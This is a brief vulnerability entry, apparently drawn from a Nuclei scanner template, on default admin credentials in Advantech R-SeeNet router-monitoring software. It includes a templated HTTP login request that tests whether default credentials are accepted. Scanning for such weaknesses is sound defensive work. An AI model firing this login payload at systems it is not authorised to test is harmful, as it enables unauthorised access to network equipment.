# Vulnerability: Advantech R-SeeNet Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`rseenet-default-login.yaml`)

## Description
Advantech R-SeeNet default admin credentials were discovered. R-SeeNet is a software system used for monitoring of status and functions of Advantech routers.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

page=login_change&oper=0&username={{user}}&password={{pass}}&submit=Login
```

